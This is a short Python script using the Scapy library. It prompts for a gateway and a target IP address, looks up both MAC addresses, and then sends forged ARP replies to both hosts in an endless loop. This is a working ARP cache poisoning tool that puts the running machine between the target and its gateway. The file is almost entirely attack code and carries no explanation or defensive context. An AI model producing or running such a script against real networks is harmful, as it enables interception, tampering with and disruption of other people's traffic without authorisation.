from scapy.all import *
from scapy.layers.l2 import ARP

gateway_ip = input("Enter the gateway IP: ")
target_ip = input("Enter your target IP: ")


def mac_ad(ip):
    response, unanswered = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip), retry=2, timeout=10)
    for a, b in response:
        print(a)
        print(b)
        return b[ARP].hwsrc
    return None


gateway_mac = mac_ad(gateway_ip)
target_mac = mac_ad(target_ip)


def arp_poison(gate_ip, gate_mac, tar_ip, tar_mac):
    while True:
        send(ARP(op=2, pdst= gate_ip, hwdst=gate_mac, psrc=tar_ip))
        send(ARP(op=2, pdst=tar_ip, hwdst=tar_mac, psrc=gate_ip))


arp_poison(gateway_ip, gateway_mac, target_ip, target_mac)
